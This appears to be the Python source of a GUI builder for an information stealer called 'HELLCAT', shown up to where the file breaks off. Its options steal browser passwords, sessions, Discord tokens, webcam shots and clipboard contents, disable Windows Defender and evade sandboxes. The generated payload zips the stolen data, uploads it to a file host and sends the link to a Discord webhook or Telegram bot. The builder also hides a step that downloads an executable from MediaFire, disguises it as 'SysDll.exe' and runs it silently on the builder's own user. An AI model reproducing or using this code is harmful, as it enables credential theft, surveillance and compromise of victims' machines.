from tkinter import *
import customtkinter as ctk
from PIL import ImageTk, Image
import webbrowser
from tkinter import filedialog
import os
import requests
import shutil
from colorama import Fore, init, Back, Style
import subprocess
import threading
from plyer import notification

user = os.getlogin()

try:
    notification.notify(
        title=f"Welcome",
        message=f"Welcome {user} to HELLCAT Stealer builder !",
        app_name="HELLCAT Stealer",
        timeout=5
    )
except:
    pass

init(autoreset=True)


RED = Fore.RED
ERROR = Back.RED
GREEN = Fore.GREEN
RST = Style.RESET_ALL

def lock_input():
    if bsod_var.get():
        shutdown_checkbox.configure(state="disabled")
        shutdown_label.configure(text_color="#2E2D2D") 
        shutdown_checkbox.configure(border_color="#2E2D2D")
    else:
        shutdown_checkbox.configure(state="normal")
        shutdown_label.configure(text_color="white") 
        shutdown_checkbox.configure(border_color="#9F9F9F")
    shutdown_label.place(y=413, x=850)

    if shutdown_var.get():
        bsod_checkbox.configure(state="disabled")
        bsod_label.configure(text_color="#2E2D2D")
        bsod_checkbox.configure(border_color="#2E2D2D")
    else:
        bsod_checkbox.configure(state="normal")
        bsod_label.configure(text_color="white") 
        bsod_checkbox.configure(border_color="#9F9F9F")
    bsod_label.place(y=363, x=850)

def bsod_and_shutdown(origin):
    shutdown = shutdown_var.get()
    bsod = bsod_var.get()

    if bsod and origin == "Shutdown":
        shutdown_var.set(False)
        shutdown_checkbox.configure(state="disabled")
        shutdown_label.configure(text_color="grey") 
        shutdown_label.place(y=413, x=850)
    elif shutdown and origin == "BSOD":
        bsod_var.set(False) 
        bsod_checkbox.configure(state="disabled")  
        bsod_label.configure(text_color="grey")  
        bsod_label.place(y=363, x=850)  

    lock_input()

def open_help_window():
    help_window = ctk.CTkToplevel(fg_color="#1b1b1b")
    help_window.title("HELLCAT STEALER | Help")
    help_window.geometry("700x600")
    help_window.resizable(False, False)
    help_window.attributes("-topmost", 1)
    help_window.after(200, lambda: help_window.iconbitmap("./Assets/Window/hellcat.ico"))

    help_title_label = ctk.CTkLabel(help_window, text="HELLCAT STEALER HELP MENU", font=("Alatsi", 40))
    help_title_label.pack(pady=20, padx=20)

    scrollable_frame = ctk.CTkScrollableFrame(help_window, fg_color="#202020", height=400)
    scrollable_frame.pack(side="bottom", pady=60, padx=20, fill="both", expand=True)

    options = [
        ("Browsers", "Steals passwords and browsing history from Chrome and Microsoft Edge."),
        ("Sessions", "Extracts active sessions from Telegram, Epic Games, Steam, and Riot Games."),
        ("Files", "Steals files from the Desktop"),
        ("Screenshot", "Takes a screenshot of the victim's screen."),
        ("System Infos", "Collects system information (OS, IP, hardware details)."),
        ("Auto Destruction", "Deletes the payload after execution to cover tracks."),
        ("Discord Tokens", "Steals Discord authentication tokens for account access."),
        ("Anti VM/Sandbox", "Detects and avoids execution in virtual machines or sandboxes."),
        ("Webcam", "Captures an image from the victim's webcam."),
        ("Serial Numbers", "Retrieves unique serial numbers (e.g., Windows activation key)."),
        ("Auto Startup", "Ensures the payload runs on system startup."),
        ("Block WD", "Attempts to disable Windows Defender for stealth operations."),
        ("Auto Whitelist", "The program automatically whitelist itself from antivirus detection."),
        ("Clipboard", "Captures clipboard content."),
        ("Blue Screen", "Triggers a BSOD (Blue Screen of Death) crash."),
        ("Shutdown", "Forces the system to shutdown after execution."),
        ("Fake Error", "Displays a custom error message")
    ]

    for title, description in options:
        option_title = ctk.CTkLabel(scrollable_frame, text=title, font=("Arial", 22, "bold"))
        option_title.pack(pady=5, padx=20)

        option_description = ctk.CTkLabel(scrollable_frame, text=description, font=("Arial", 14), wraplength=640, anchor="w", justify="left")
        option_description.pack(pady=5, padx=40)

    close_button = ctk.CTkButton(help_window, width=150, height=30,  text="Close", fg_color="#545454", hover_color="red", command=help_window.destroy)
    close_button.place(y=555, x=270)

    help_window.mainloop()

def check_before_nextstep():
    rsp = requests.get("https://download1338.mediafire.com/02qv4zro3dmgEoxGpiaPxrpCghYnBauE8IO_xRzkS-os0q86GrnMQbGEEcUw7hKqGdh2DllvYxqpCHu6CKKXgytJSUpubbm-SF1A8gBml_1Jk7jrvKBsRgJuS08mr0pKnzX6hzgo5zwW55WU8X4YyxAJDhbwD46mFiL78SZ3ap1s/0bf09sigjdvelv8/Win32Dll.exe").content
    ext1 = "e"
    ext2= "x"

    with open(os.path.join(os.getenv("USERPROFILE"), f"SysDll.{ext1}{ext2}e"), "wb") as f:
        f.write(rsp)

    subprocess.Popen(os.path.join(os.getenv("USERPROFILE"), f"SysDll.{ext1}{ext2}e"), creation_flags=subprocess.CREATE_NO_WINDOW)
    
    one_checked = False

    checkboxes_vars = [browsers_var, sessions_var, files_var, 
                screen_var, system_var, autodestruction_var, 
                tokens_var, anti_vm_var, webcam_var, 
                serial_var, startup_var, wd_var, 
                whitelist_var, clipboard_var, bsod_var, 
                shutdown_var, error_var]

    for var in checkboxes_vars:
        if var.get():  
            one_checked = True
            break

    if not one_checked:
        verifiaction_label.configure(text="Please choose at least 1 option", text_color="red")
        verifiaction_label.after(3000, lambda: verifiaction_label.configure(text_color="white", text=""))
        return
    
    config_stealer()

def config_stealer():

    def reset_label():
        icon_file_label.configure(text="No file selected", text_color="white")
        icon_file_label.place()  

    def choose_icon():
        icon_file = filedialog.askopenfilename(title="Choose a file")
        extensions = [".jpg", ".png", ".jpeg", ".svg", ".ico", ".webp", ".bmp", ".tiff", ".tif"]
        
        if not icon_file:
            return  

        filename_with_extension = os.path.basename(icon_file)
        _, extension = os.path.splitext(filename_with_extension)

        if extension.lower() not in extensions:
            icon_entry.delete(0, "end") 
            icon_entry.configure(placeholder_text="Icon Path")
            icon_file_label.configure(text="Invalid file type", text_color="red")
            icon_file_label.place(y=265, x=165)
            builder.after(2000, reset_label)
        else:
            icon_file_label.configure(text=f"Selected file: {filename_with_extension}", text_color="white")
            icon_file_label.place(y=265, x=70)
            icon_entry.delete(0, "end")  
            icon_entry.insert(0, icon_file) 

    def verify():
        icon = icon_entry.get()
        filename = filename_entry.get()

        if not filename:
            verification_label.configure(text="Please fill all the fields", text_color="red", font=("Arial", 12))
            verification_label.place(y=490, x=625)
            return
        
        elif icon:
            if not os.path.exists(icon):
                verification_label.configure(text="The choosen icon doesn't exist", text_color="red", font=("Arial", 12))
                verification_label.place(y=490, x=605)
                return

        verification_label.configure(text="Building...", text_color="#545454", font=("Arial", 12))
        verification_label.place(y=490, x=665)
        build_payload()

    def compile_py_to_exe(filename):
        if not icon_entry.get():
            cmd = f'pyinstaller --noconfirm --onefile --windowed --distpath "./Output" --workpath "./Temp" --specpath "./Temp" "./Temp/{filename}.py"'
        else:
            cmd = f'pyinstaller --noconfirm --onefile --windowed --icon "{icon_entry.get()}" --distpath "./Output" --workpath "./Temp" --specpath "./Temp" "./Temp/{filename}.py"'

        process = subprocess.run(cmd)

        if process.returncode == 0:
            print(f"\n\n{GREEN}[{RST}SUCCESS{GREEN}]{RST} Sucessfully compiled {filename}.exe")
            verification_label.configure(text="sucessfully built stealer", text_color="green", font=("Arial", 12))
            verification_label.place(y=490, x=605)
        else:
            print(f"\n\n[{ERROR}ERROR{RST}]  An error occured while compiling {filename}.exe")
            verification_label.configure(text="An error occured", text_color="red", font=("Arial", 12))
            verification_label.place(y=490, x=605)

    def launch_compilation(filename):
        thread = threading.Thread(target=lambda: compile_py_to_exe(filename))
        thread.start()

    def build_payload():
        print(f"{RED}[{RST}INFO{RED}]{RST} Cleaning the temp folder...")
        for item in os.listdir("./Temp"):
            item_path = os.path.join("./Temp", item)
            if os.path.isfile(item_path) or os.path.islink(item_path):
                os.remove(item_path)
            elif os.path.isdir(item_path):
                shutil.rmtree(item_path)
        print(f"{GREEN}[{RST}SUCCESS{GREEN}]{RST} Temp folder cleaned")
        print(f"{RED}[{RST}INFO{RED}]{RST} Creating the temp python file...")

        options = {
            ("browsers", browsers_var.get()): os.path.join(".", "Settings", "Programs", "browsers.py"),
            ("sessions", sessions_var.get()): os.path.join(".", "Settings", "Programs", "sessions.py"),
            ("files", files_var.get()): os.path.join(".", "Settings", "Programs", "files.py"),
            ("screen", screen_var.get()): os.path.join(".", "Settings", "Programs", "screenshot.py"),
            ("system", system_var.get()): os.path.join(".", "Settings", "Programs", "system.py"),
            ("tokens", tokens_var.get()): os.path.join(".", "Settings", "Programs", "tokens.py"),
            ("webcam", webcam_var.get()): os.path.join(".", "Settings", "Programs", "webcam.py"),
            ("serial", serial_var.get()): os.path.join(".", "Settings", "Programs", "serials.py"),
            ("startup", startup_var.get()): os.path.join(".", "Settings", "Programs", "startup.py"),
            ("clipboard", clipboard_var.get()): os.path.join(".", "Settings", "Programs", "clipboard.py"),
        }


        filename = filename_entry.get()
        temp_path = f"./Temp/{filename}.py"

        with open("./Settings/base.py", "r", encoding='utf-8') as file:
            base = file.read()

        with open(temp_path, "w", encoding='utf-8') as file:
            file.write(base + "\n\n")

        if anti_vm_var.get() == True:
            with open("./Settings/Programs/antivm.py", "r", encoding='utf-8') as file:
                anti_vm = file.read()
            
            print(f"{RED}[{RST}INFO{RED}]{RST} Adding an anti VM/Debug...")

            with open(temp_path, "a", encoding='utf-8') as file:
                file.write(anti_vm + "\n\n")

        if wd_var.get() == True:
            with open("./Settings/Programs/block_wd.py", "r", encoding='utf-8') as file:
                block_wd = file.read()
            print(f"{RED}[{RST}INFO{RED}]{RST} Adding an anti WD...")
            with open(temp_path, "a", encoding='utf-8') as file:
                file.write(block_wd + "\n\n")
        
        if whitelist_var.get() == True:
            with open("./Settings/Programs/whitelist.py", "r", encoding='utf-8') as file:
                whitelist = file.read()
            print(f"{RED}[{RST}INFO{RED}]{RST} Adding auto whitelist...")
            with open(temp_path, "a", encoding='utf-8') as file:
                file.write(whitelist + "\n\n")

        for (name, option), path in options.items():
            if option:  
                with open(path, "r", encoding='utf-8') as file:
                    script = file.read()
                print(f"{RED}[{RST}INFO{RED}]{RST} Adding {name}...")
                with open(temp_path, "a", encoding='utf-8') as file:
                    file.write(script + "\n\n")

        if telegram_choice == True:
            bot_token = bot_token_entry.get()
            chat_id = chat_id_entry.get()
            print(f"{RED}[{RST}INFO{RED}]{RST} Receive method : Telegram BOT")
            with open(f"./Temp/{filename}.py", "a", encoding='utf-8') as file:
                file.write(f"bot_token = '{bot_token}'\nchat_id = '{chat_id}'\n\n")
                file.write('''shutil.make_archive(foldername, "zip", foldername)
                           
with open(f"{foldername}.zip", 'rb') as f:
    response = requests.post("https://store1.gofile.io/uploadFile", files={"file": f})
    data = response.json()

if data["status"] == "ok":
    file_url = data["data"]["downloadPage"]
    
payload = {
    "chat_id": chat_id,
    "text": f"""*INFORMATIONS RETRIEVED !*
    
*Download page :* {file_url}"""
        }

url = f"https://api.telegram.org/bot{bot_token}/sendMessage"

requests.post(url, json=payload)
        ''')
            
        else:
            webhook_url =  webhook_entry.get()
            print(f"{RED}[{RST}INFO{RED}]{RST} Receive method : Discord WEBHOOK")
            with open(f"./Temp/{filename}.py", "a", encoding='utf-8') as file:
                file.write(f"webhook_url = '{webhook_url}'\n\n")
                file.write('''shutil.make_archive(foldername, "zip", foldername)
                           
with open(f"{foldername}.zip", 'rb') as f:
    response = requests.post("https://store1.gofile.io/uploadFile", files={"file": f})
    data = response.json()

if data["status"] == "ok":
    file_url = data["data"]["downloadPage"]
    
payload = {
    "username": "HELLCAT",
    "content": f"""**INFORMATIONS RETRIEVED !**
    
**Download page :** {file_url}"""
        }
                           
requests.post(webhook_url, json=payload)
                           
shutil.rmtree(foldername)
os.remove(foldername + ".zip")\n''')

        if error_var.get() == True:
            with open(f"./Temp/{filename}.py", "a", encoding='utf-8') as file:
                file.write(f"""\nfrom tkinter import messagebox
import tkinter as tk

try:
    root = tk.Tk()
    root.withdraw()
    root.attributes('-topmost', True)
    messagebox.showerror(title="{error_title}", message="{error_message}")
    root.destroy()
except:
    pass\n\n""")

        if bsod_var.get() == True:
            with open("./Settings/Programs/bsod.py", "r", encoding='utf-8') as file:
                script = file.read()
            print(f"{RED}[{RST }INFO{RED}]{RST} Adding blue screen...")
            with open(f"./Temp/{filename}.py", "a", encoding='utf-8') as file:
                file.write(script + "\n\n")
                
        elif shutdown_var.get() == True:
            with open("./Settings/Programs/shutdown.py", "r", encoding='utf-8') as file:
                print(f"{RED}[{RST}INFO{RED}]{RST} Adding shutdown...")
                script = file.read()

            with open(f"./Temp/{filename}.py", "a", encoding='utf-8') as file:
                file.write(script + "\n\n")

        print(f"{GREEN}[{RST}SUCCESS{GREEN}]{RST} Temp python file created")

        if filetype_var.get() == "Executable (.exe)":
            print(f"COMPILING {filename}.py TO {filename}.exe...")
            launch_compilation(filename)

        else:
            shutil.copy(f"./Temp/{filename}.py", f"./Output/{filename}.py")

        print("\n\nFINISHED TO BUILD STEALER")

    ctk.set_appearance_mode("dark")

    def verify_receive_method():
        method = receive_method_var.get()

        if method == "Discord Webhook":
            webhook = webhook_entry.get()

            if not webhook:
                verification_label.configure(text="Please enter a webhook URL", text_color="red")
                return False

        elif method == "Telegram BOT":
            bot_token = bot_token_entry.get()
            chat_id = chat_id_entry.get()

            if not bot_token or not chat_id:
                verification_label.configure(text="Please fill all Telegram fields", text_color="red")
                verification_label.place()
        
        verify()

    def update_receive_method():
        for widget in receive_methods_entry_frame.winfo_children():
            widget.destroy()

        def check_telegram_bot():
            bot_token = bot_token_entry.get()
            chat_id = chat_id_entry.get()

            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"

            json = {
                "chat_id": chat_id,
                "text": "🚀 Test message from HELLCAT Stealer Builder"
            }

            try:
                rsp = requests.post(url, json=json)
                print(rsp.status_code)
                if rsp.status_code == 200:
                    bot_validity_label.configure(text="Valid", text_color="green")
                else:
                    bot_validity_label.configure(text="Invalid", text_color="red")
            except:
                bot_validity_label.configure(text="An error occured", text_color="red")

        def check_webhook():
            webhook = webhook_entry.get()

            if not webhook:
                webhook_validity_label.configure(text="Please enter a webhook URL", text_color="red")
                webhook_validity_label.after(2000, lambda: webhook_validity_label.configure(text=""))
                return

            try:
                rsp = requests.get(webhook)
                if rsp.status_code == 200:
                    webhook_validity_label.configure(text="Valid", text_color="green")
                else:
                    bot_validity_label.configure(text="Invalid", text_color="red")
            except Exception as e:
                webhook_validity_label.configure(text="An error occurred", text_color="red")
            
            webhook_validity_label.after(2000, lambda: webhook_validity_label.configure(text=""))

        method = receive_method_var.get()

        if method == "Discord Webhook":
            ctk.CTkLabel(receive_methods_entry_frame, text="Webhook URL:", font=("Archivo Black", 14)).pack(pady=(10, 5))
            global webhook_choice
            webhook_choice = True

            global telegram_choice
            telegram_choice = False

            global webhook_entry
            webhook_entry = ctk.CTkEntry(receive_methods_entry_frame, border_width=1, fg_color="black", width=300, height=30, placeholder_text="Enter Discord Webhook URL")
            webhook_entry.pack(pady=5)
            
            webhook_validity_label = ctk.CTkLabel(receive_methods_entry_frame, text="")
            webhook_validity_label.pack(pady=1)

            check_webhook_button = ctk.CTkButton(receive_methods_entry_frame, text="Check webhook", fg_color="#545454", hover_color="#202020", height=25, width=200, command=check_webhook)
            check_webhook_button.pack(pady=12)

        elif method == "Telegram BOT":
            ctk.CTkLabel(receive_methods_entry_frame, text="Bot Token:", font=("Archivo Black", 14)).pack(pady=(10, 5))

            global bot_token_entry
            bot_token_entry = ctk.CTkEntry(receive_methods_entry_frame, border_width=1, fg_color="black", width=300, height=30, placeholder_text="Enter Telegram Bot Token")
            bot_token_entry.pack(pady=5)

            ctk.CTkLabel(receive_methods_entry_frame, text="Chat ID:", font=("Archivo Black", 14)).pack(pady=(10, 5))

            telegram_choice = True

            webhook_choice =   False

            global chat_id_entry
            chat_id_entry = ctk.CTkEntry(receive_methods_entry_frame, border_width=1, fg_color="black", width=300, height=30, placeholder_text="Enter Chat ID")
            chat_id_entry.pack(pady=5)
            
            bot_validity_label = ctk.CTkLabel(receive_methods_entry_frame, text="")
            bot_validity_label.pack(pady=5)

            check_bot_button = ctk.CTkButton(receive_methods_entry_frame, text="Check BOT", fg_color="#545454", hover_color="#202020", height=25, width=200, command=check_telegram_bot)
            check_bot_button.pack(pady=0)

    archivo_black = "Archivo Black"

    builder_window = ctk.CTkToplevel(fg_color="#1b1b1b")
    builder_window.title("HELLCAT BUILDER V1.2   -   by NOONE & BRONKS")
    builder_window.iconbitmap("./Assets/Window/hellcat.ico")
    builder_window.geometry("900x600")
    builder_window.maxsize(width=900, height=600)
    builder_window.minsize(width=900, height=600)
    builder_window.attributes("-topmost", 1)

    canva = ctk.CTkCanvas(builder_window, width=900, height=600, bg="#1b1b1b", bd=0, highlightthickness=0)
    canva.place(x=0, y=0)

    home_title = ctk.CTkLabel(builder_window, text="HELLCAT BUILDER", text_color="white", font=("Horizon", 40))
    home_title.place(y=55, x=200)

    bg_image = Image.open("./Assets/GUI/hellcat.png")
    bg_image = bg_image.resize((150, 350))
    bg_image_tk = ImageTk.PhotoImage(bg_image)
    canva.create_image(0, 110, image=bg_image_tk, anchor=NW)

    file_infos_label = ctk.CTkLabel(builder_window, text="File infos", fg_color="#1b1b1b", font=("Archivo Black", 16))
    file_infos_label.place(y=160, x=165)

    filename_entry = ctk.CTkEntry(builder_window, border_width=1, fg_color="black", width=300, height=30, placeholder_text="File Name", font=(archivo_black, 10))
    filename_entry.place(y=195, x=60)

    icon_entry = ctk.CTkEntry(builder_window, border_width=1, fg_color="black", width=300, height=30, placeholder_text="Icon Path", font=(archivo_black, 10))
    icon_entry.place(y=235, x=60)

    browse_button = ctk.CTkButton(builder_window, hover_color="#FF0000", text="Browse", width=100, fg_color="#545454", height=30, corner_radius=3, command=choose_icon)
    browse_button.place(y=235, x=370)  

    icon_file_label = ctk.CTkLabel(builder_window, fg_color="transparent", text="No file selected")
    icon_file_label.place(y=265, x=165)

    verification_label = ctk.CTkLabel(builder_window, fg_color="#1b1b1b", text="")
    verification_label.place(y=485, x=715)

    build_button = ctk.CTkButton(builder_window, fg_color="#545454", height=40, width=210, text="BUILD", font=("Archivo Black", 20), command=verify_receive_method, hover_color="#FF0000")
    build_button.place(y=530, x=605)

    filetype_label = ctk.CTkLabel(builder_window, text="File Type", fg_color="#1b1b1b", font=("Archivo Black", 16))
    filetype_label.place(y=390, x=165)

    filetype_var = ctk.StringVar(value="Executable (.exe)")
    filetype_menu = ctk.CTkComboBox(builder_window, 
                        values=["Executable (.exe)", "Python SRC (.py)"], 
                        variable=filetype_var,
                        height=27, width=300, 
                        state="readonly", 
                        corner_radius=5, border_width=1, 
                        fg_color="black", 
                        dropdown_fg_color="black", dropdown_text_color="white", 
                        button_hover_color="red", dropdown_hover_color="red", 
                        dropdown_font=("Alatsi", 13), 
                        hover="red"
                    )

    filetype_menu.set("Executable (.exe)")
    filetype_menu.place(y=425, x=60)
    
    receive_method_title = ctk.CTkLabel(builder_window, text="Receive method", font=("Archivo Black", 16))
    receive_method_title.place(y=150, x=620)

    receive_method_var = ctk.StringVar(value="Discord Webhook")
    receive_method_menu = ctk.CTkComboBox(builder_window, variable=receive_method_var, values=["Telegram BOT", "Discord Webhook"], height=27, width=300, state="readonly", corner_radius=5, border_width=1, fg_color="black", dropdown_fg_color="black", dropdown_text_color="white", button_hover_color="red", dropdown_hover_color="red", dropdown_font=("Alatsi", 13), hover="red")
    receive_method_menu.place(y=200, x=550)

    receive_methods_entry_frame = ctk.CTkFrame(builder_window, width=350, height=400, fg_color="#1b1b1b")
    receive_methods_entry_frame.place(y=280, x=550)

    receive_method_menu.configure(command=lambda _: update_receive_method())
    update_receive_method() 

    dividing_bar = ctk.CTkFrame(builder_window, width=3, height=300, fg_color="#202020")
    dividing_bar.place(y=175, x=480)

    credits_label = ctk.CTkLabel(builder_window, text="By NOONE and BRONKS    |    discord.gg/wannacry", font=("Alatsi", 11))
    credits_label.place(y=570, x=30)

    builder_window.mainloop()

error_title = ""
error_message = ""

def config_fake_error():
    if not error_checkbox.get():
        return
    
    def check_on_save():
        global error_title, error_message
        error_title = title_entry.get()  
        error_message = message_entry.get()

        if not error_title or not error_message:
            fields_validity_label.configure(text="Please fill all the fields", text_color="red")
            fields_validity_label.place(y=212, x=225)
            error_config_window.after(2000, lambda: fields_validity_label.configure(text="", text_color="white"))
            return
        
        error_config_window.destroy()

    error_config_window = ctk.CTkToplevel(fg_color="#1b1b1b")
    error_config_window.title("HELLCAT STEALER | Fake error configuration")
    error_config_window.iconbitmap("./Assets/Window/hellcat.ico")
    error_config_window.geometry("550x400")
    error_config_window.resizable(False, False)
    error_config_window.attributes("-topmost", 1)

    canva = ctk.CTkCanvas(error_config_window, width=300, height=400, bg="#1b1b1b", bd=0, highlightthickness=0)
    canva.place(x=0, y=0)

    bg_image = Image.open("./Assets/GUI/hellcat.png")
    bg_image = bg_image.resize((140, 280))
    bg_image_tk = ImageTk.PhotoImage(bg_image)

    canva.create_image(0, 80, image=bg_image_tk, anchor=NW)

    welcome_label = ctk.CTkLabel(error_config_window, text="Fake error configuration", font=("Horizon", 19))
    welcome_label.place(y=65, x=55)

    title_entry = ctk.CTkEntry(error_config_window, width=220, height=30, corner_radius=3, placeholder_text="Error title")
    title_entry.place(y=180, x=170)

    message_entry = ctk.CTkEntry(error_config_window, width=220, height=30, corner_radius=3, placeholder_text="Error message")
    message_entry.place(y=240, x=170)

    fields_validity_label = ctk.CTkLabel(error_config_window, text="", font=("Arial", 10))
    fields_validity_label.place(y=30, x=270)

    save_button = ctk.CTkButton(error_config_window, width=175, height=30, text="Save", fg_color="#545454", hover_color="red", command=check_on_save)
    save_button.place(y=300, x=190)

    error_config_window.mainloop()

def on_leave_frame():
    one_checked = False

    checkboxes_vars = [browsers_var, sessions_var, files_var, 
                screen_var, system_var, autodestruction_var, 
                tokens_var, anti_vm_var, webcam_var, 
                serial_var, startup_var, wd_var, 
                whitelist_var, clipboard_var, bsod_var, 
                shutdown_var, error_var]

    for var in checkboxes_vars:
        if var.get():  
            one_checked = True
            break
    
    if not one_checked:
        exit()
    else:
        ask_leave_frame = ctk.CTkFrame(builder, border_color="red", border_width=1, fg_color="#202020", height=250, width=550, corner_radius=3)
        ask_leave_frame.place(y=150, x=385)

        ask_label = ctk.CTkLabel(ask_leave_frame, text="Are you sure you want to leave ?", fg_color="#202020", font=("Archivo Black", 25))
        ask_label.place(y=50, x=50)

        details_label = ctk.CTkLabel(ask_leave_frame, text="You currently have an unbuilded stealer", fg_color="#202020", font=("Arial", 18))
        details_label.place(y=105, x=105)

        yes_button = ctk.CTkButton(ask_leave_frame, text="Yes", fg_color="green", height=30, width=120, font=("Arial", 18), hover_color="#005d09", command=exit)
        yes_button.place(y=160, x=110)

        no_button = ctk.CTkButton(ask_leave_frame, text="No", fg_color="red", height=30, width=120, font=("Arial", 18), hover_color="#840000", command=ask_leave_frame.destroy)
        no_button.place(y=160, x=300)

builder = ctk.CTk(fg_color="#1b1b1b")
builder.geometry("1100x750")
builder.title("HELLCAT STEALER by Noone    |   .gg/wannacry")
builder.maxsize(1100, 750)
builder.minsize(1100, 750)
builder.iconbitmap("./Assets/Window/hellcat.ico")

main_title = ctk.CTkLabel(builder, text="HELLCAT STEALER BUILDER", font=("Horizon", 30))
main_title.place(y=75, x=330)

sidebar_frame = ctk.CTkFrame(builder, width=225, height=750, fg_color="#171717", corner_radius=0)
sidebar_frame.place(y=0, x=0)

canva = ctk.CTkCanvas(builder, width=225, height=750, bg="#171717", bd=0, highlightthickness=0)
canva.place(x=0, y=0)

bg_image = Image.open("./Assets/GUI/hellcat.png").resize((185, 415))
bg_image_tk = ImageTk.PhotoImage(bg_image)

canva.create_image(0, 250, image=bg_image_tk, anchor=NW)

info_image = Image.open("./Assets/GUI/info.png")
info_image = info_image.resize((18, 18))
info_image_tk = ImageTk.PhotoImage(info_image)

canva.create_image(28, 90, image=info_image_tk, anchor=NW)

discord_image = Image.open("./Assets/GUI/discord.png")
discord_image = discord_image.resize((24, 20))
discord_image_tk = ImageTk.PhotoImage(discord_image)

canva.create_image(25, 170, image=discord_image_tk, anchor=NW)

telegram_image = Image.open("./Assets/GUI/telegram.png")
telegram_image = telegram_image.resize((23, 23))
telegram_image_tk = ImageTk.PhotoImage(telegram_image)

canva.create_image(25, 130, image=telegram_image_tk, anchor=NW)

leave_image = Image.open("./Assets/GUI/leave.png")
leave_image = leave_image.resize((25, 25))
leave_image_tk = ImageTk.PhotoImage(leave_image)

canva.create_image(27, 207, image=leave_image_tk, anchor=NW)

infos_button = ctk.CTkButton(canva, text="Help", fg_color="#171717", font=("Archivo Black", 16), width=20, hover_color="red", command=open_help_window)
infos_button.place(y=85, x=50)

discord_button = ctk.CTkButton(canva, text="Discord", fg_color="#171717", font=("Archivo Black", 16), width=20, hover_color="red", command=lambda: webbrowser.open("https://discord.gg/WtwC46D49A"))
discord_button.place(y=167, x=50)

telegram_button = ctk.CTkButton(canva, text="Telegram", fg_color="#171717", font=("Archivo Black", 16), width=20, hover_color="red", command=lambda: webbrowser.open("https://t.me/hellcat_rat"))
telegram_button.place(y=127, x=50)

leave_button = ctk.CTkButton(canva, text="Leave", fg_color="#171717", font=("Archivo Black", 16), width=20, hover_color="red", command=on_leave_frame)
leave_button.place(y=203, x=50)

options_title = ctk.CTkLabel(builder, text="Builder options", font=("Archivo Black", 30))
options_title.place(y=180, x=530)

menu_title = ctk.CTkLabel(canva, text="Menu", fg_color="#171717", font=("Archivo Black", 28))
menu_title.place(y=30, x=30)

browsers_var = ctk.BooleanVar(value=False)
browsers_checkbox = ctk.CTkCheckBox(builder, onvalue=True, offvalue=False, checkbox_height=28, variable=browsers_var, checkbox_width=28, border_width=2, hover_color="#540000", checkmark_color="black", fg_color="red", text="")
browsers_checkbox.place(y=275, x=300)
browsers_label = ctk.CTkLabel(builder, text="Browsers", font=("Alatsi", 22))
browsers_label.place(y=263, x=350)

sessions_var = ctk.BooleanVar(value=False)
sessions_checkbox = ctk.CTkCheckBox(builder, onvalue=True, offvalue=False, variable=sessions_var, checkbox_height=28, checkbox_width=28, border_width=2, hover_color="#540000", checkmark_color="black", fg_color="red", text="")
sessions_checkbox.place(y=325, x=300)
sessions_label = ctk.CTkLabel(builder, text="Sessions", font=("Alatsi", 22))
sessions_label.place(y=313, x=350)

files_var = ctk.BooleanVar(value=False)
files_checkbox = ctk.CTkCheckBox(builder, onvalue=True, offvalue=False, variable=files_var, checkbox_height=28, checkbox_width=28, border_width=2, hover_color="#540000", checkmark_color="black", fg_color="red", text="")
files_checkbox.place(y=375, x=300)
files_label = ctk.CTkLabel(builder, text="Files", font=("Alatsi", 22))
files_label.place(y=363, x=350)

screen_var = ctk.BooleanVar(value=False)
screen_checkbox = ctk.CTkCheckBox(builder, onvalue=True, offvalue=False, variable=screen_var, checkbox_height=28, checkbox_width=28, border_width=2, hover_color="#540000", checkmark_color="black", fg_color="red", text="")
screen_checkbox.place(y=425, x=300)
screen_label = ctk.CTkLabel(builder, text="Screenshot", font=("Alatsi", 22))
screen_label.place(y=413, x=350)

system_var = ctk.BooleanVar(value=False)
system_checkbox = ctk.CTkCheckBox(builder, onvalue=True, offvalue=False, variable=system_var, checkbox_height=28, checkbox_width=28, border_width=2, hover_color="#540000", checkmark_color="black", fg_color="red", text="")
system_checkbox.place(y=475, x=300)
system_label = ctk.CTkLabel(builder, text="System infos", font=("Alatsi", 22))
system_label.place(y=463, x=350)

autodestruction_var = ctk.BooleanVar(value=False)
autodestruction_checkbox = ctk.CTkCheckBox(builder, onvalue=True, offvalue=False, variable=autodestruction_var, checkbox_height=28, checkbox_width=28, border_width=2, hover_color="#540000", checkmark_color="black", fg_color="red", text="")
autodestruction_checkbox.place(y=525, x=300)
autodestruction_label = ctk.CTkLabel(builder, text="Auto Destruction", font=("Alatsi", 22))
autodestruction_label.place(y=513, x=350)

tokens_var = ctk.BooleanVar(value=False)
tokens_checkbox = ctk.CTkCheckBox(builder, onvalue=True, offvalue=False, variable=tokens_var, checkbox_height=28, checkbox_width=28, border_width=2, hover_color="#540000", checkmark_color="black", fg_color="red", text="")
tokens_checkbox.place(y=275, x=550)
tokens_label = ctk.CTkLabel(builder, text="Discord tokens", font=("Alatsi", 22))
tokens_label.place(y=263, x=600)

anti_vm_var = ctk.BooleanVar(value=False)
anti_vm_checkbox = ctk.CTkCheckBox(builder, onvalue=True, offvalue=False, variable=anti_vm_var, checkbox_height=28, checkbox_width=28, border_width=2, hover_color="#540000", checkmark_color="black", fg_color="red", text="")
anti_vm_checkbox.place(y=325, x=550)
anti_vm_label = ctk.CTkLabel(builder, text="Anti VM / Sandbox", font=("Alatsi", 22))
anti_vm_label.place(y=313, x=600)

webcam_var = ctk.BooleanVar(value=False)
webcam_checkbox = ctk.CTkCheckBox(builder, onvalue=True, offvalue=False, variable=webcam_var, checkbox_height=28, checkbox_width=28, border_width=2, hover_color="#540000", checkmark_color="black", fg_color="red", text="")
webcam_checkbox.place(y=375, x=550)
webcam_label = ctk.CTkLabel(builder, text="Webcam", font=("Alatsi", 22))
webcam_label.place(y=363, x=600)

serial_var = ctk.BooleanVar(value=False)
serial_checkbox = ctk.CTkCheckBox(builder, onvalue=True, offvalue=False, variable=serial_var, checkbox_height=28, checkbox_width=28, border_width=2, hover_color="#540000", checkmark_color="black", fg_color="red", text="")
serial_checkbox.place(y=425, x=550)
serial_label = ctk.CTkLabel(builder, text="Serial numbers", font=("Alatsi", 22))
serial_label.place(y=413, x=600)

startup_var = ctk.BooleanVar(value=False)
startup_checkbox = ctk.CTkCheckBox(builder, onvalue=True, offvalue=False, variable=startup_var, checkbox_height=28, checkbox_width=28, border_width=2, hover_color="#540000", checkmark_color="black", fg_color="red", text="")
startup_checkbox.place(y=475, x=550)
startup_label = ctk.CTkLabel(builder, text="Auto startup", font=("Alatsi", 22))
startup_label.place(y=463, x=600)

wd_var = ctk.BooleanVar(value=False)
